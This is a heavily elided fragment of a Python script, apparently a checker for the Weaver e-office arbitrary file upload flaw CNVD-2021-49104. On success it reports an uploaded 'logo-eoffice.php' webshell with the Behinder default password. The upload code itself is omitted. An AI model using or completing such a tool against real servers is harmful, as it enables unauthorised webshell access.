...
def main(target_url):
    ...
    print(now_time() + " [INFO]     正在检测任意文件上传漏洞 CNVD-2021-49104")
    try:
        ...
        if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
            print(now_time() + ' [SUCCESS]  泛微OAUploadFile任意文件上传漏洞存在,冰蝎默认密码:{}'.format(exp_url))
        else:
            print(now_time() + ' [WARNING]  泛微OAUploadFile任意文件上传漏洞不存在')
    except:
        print(now_time() + " [ERROR]    出错了，手工复现下吧 ")
